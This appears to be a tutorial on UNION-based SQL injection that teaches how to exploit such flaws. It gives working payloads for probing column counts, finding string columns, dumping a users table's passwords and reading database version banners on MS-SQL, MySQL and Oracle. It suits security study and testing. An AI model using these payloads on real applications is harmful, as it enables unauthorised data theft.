# The UNION Operator

The **`UNION`** operator combines the results of two or more `SELECT` queries into a single result set. If a SQL injection flaw occurs within a `SELECT` statement and the output is reflected back to the user, the `UNION` operator can be exploited to extract **arbitrary data** from the database.

---

## Basic Concept

*Example scenario*:
- Original query when searching for "Wiley":
  ```sql
  SELECT author, title, year FROM books WHERE publisher = 'Wiley'
  ```

- Injected input:
  ```
  Wiley' UNION SELECT username, password, uid FROM users--
  ```

- Final query:
  ```sql
  SELECT author, title, year FROM books WHERE publisher = 'Wiley'
  UNION SELECT username, password, uid FROM users--'
  ```

- Result:
  ```
  AUTHOR       TITLE                      YEAR
  Litchfield   The Database Hacker's...   2005
  Anley        The Shellcoder's Handbook  2007
  admin        r00tr0x                    0
  cliff        Reboot                     1
  ```

> The second `SELECT` extracts data from a completely different table and appends it to the legitimate results.

---

## Key Conditions for UNION Injection

To successfully exploit a UNION-based injection:

* **Number of Columns Must Match**: The two `SELECT` statements must return the same number of columns.
* **Compatible Data Types**: Each column in the injected query must be compatible (or convertible) with the corresponding column in the original query.
* **Knowledge of Table/Column Names**: To extract meaningful data, the attacker needs to know the relevant schema.

---

## Common Errors

- **Mismatched column count**:
  ```sql
  ORA-01789: query block has incorrect number of result columns
  ```

- **Incompatible data types**:
  ```sql
  ORA-01790: expression must have same datatype as corresponding expression
  ```

> Error codes vary by DBMS. Refer to the “SQL Syntax and Error Reference” section for equivalents.

---

## Practical Advantages for Attackers

* **NULL values are versatile**: `NULL` is implicitly convertible to any type and can be used to test column count.
* **Visible impact**: Even if errors are not returned, injected data often results in changes to the rendered HTML or raw response.
* **Only one string column needed**: Most attacks only require a single string-type column to retrieve useful data.

---

## HACK STEPS

### **Step 1: Determine the Number of Columns**
- Inject `NULL` values in increasing counts:
  ```
  ' UNION SELECT NULL--
  ' UNION SELECT NULL,NULL--
  ' UNION SELECT NULL,NULL,NULL--
  ```

- If successful:
  - Error disappears (if visible), or
  - Extra row(s) appear in the response.

- **Oracle only**: Every `SELECT` requires a `FROM` clause:
  ```
  ' UNION SELECT NULL FROM DUAL--
  ```

---

### **Step 2: Identify a String-Compatible Column**
- Replace each `NULL` with a test string to find which columns support string data:
  ```
  ' UNION SELECT 'a', NULL, NULL--
  ' UNION SELECT NULL, 'a', NULL--
  ' UNION SELECT NULL, NULL, 'a'--
  ```

- Look for `"a"` in the application’s response.

---

### **Step 3: Extract Arbitrary Data**
- Once the structure is known (e.g., 3 columns with string-compatible first column), test data extraction:
  - **MS-SQL / MySQL**:
    ```sql
    ' UNION SELECT @@version, NULL, NULL--
    ```

  - **Oracle**:
    ```sql
    ' UNION SELECT banner, NULL, NULL FROM v$version--
    ```

- Example result:
  ```
  AUTHOR         TITLE      YEAR
  Oracle9i...    Production 9.2.0
  ```

---

## NOTE

- **Injected data** will be mapped into the structure of the original query. For instance, passwords might appear in the `title` column.
- **Schema awareness** is often necessary to move beyond version strings and extract sensitive data.
- **This method is the fastest way to retrieve bulk data**, making it highly valuable where output is reflected.

---

## TIP

In error-suppressed environments:
- Use the appearance of injected rows to detect successful execution.
- View raw HTTP responses to avoid missing injected but invisible content (like empty `<td>` tags).
